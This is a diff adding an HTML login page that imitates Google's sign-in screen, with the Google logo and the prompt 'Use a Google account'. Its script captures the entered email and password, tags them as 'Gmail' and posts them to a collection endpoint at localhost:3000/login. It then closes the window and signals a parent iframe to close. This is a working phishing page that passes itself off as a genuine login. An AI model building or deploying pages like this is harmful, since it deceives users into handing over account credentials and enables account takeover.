@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Google Login Form</title>
+</head>
+<body>
+    <div class="box">
+        <img class="google-logo" src="./Google__G__logo.svg.png" height="100px" width="100px" alt="">
+        <h2>Sign in</h2>
+        <p>Use a Google account</p>
+        <form id="loginForm">
+            <div class="inputBox">
+                <input type="email" id="email" name="email" required>
+                <label>E-mail address or telephone number</label>
+            </div>
+            <div class="inputBox">
+                <input type="password" id="password" name="password" required>
+                <label>Password</label>
+            </div>
+            <div class="forgot">
+                <button type="button">Forgot your address?</button>
+            </div>
+            <button id="login-button">Sign-in</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault();  // Sayfanın yeniden yüklenmesini engelle
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const platform = "Gmail"
+
+            if (!email || !password) {
+                alert("Lütfen e-posta ve şifre girin!");
+                return;
+            }
+
+            try {
+                const response = await fetch("http://localhost:3000/login", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ email, password , platform})
+                    
+                });
+                
+                const result = await response.json();
+                alert(result.message);
+                
+            
+            } catch (error) {
+                console.error("Hata:", error);
+            }
+
+                    window.open(location, '_self').close();
+                    window.parent.postMessage("closeIframe", "*");
+            
+            
+        
+        });
+
+        
+    </script>
+</body>
+</html>
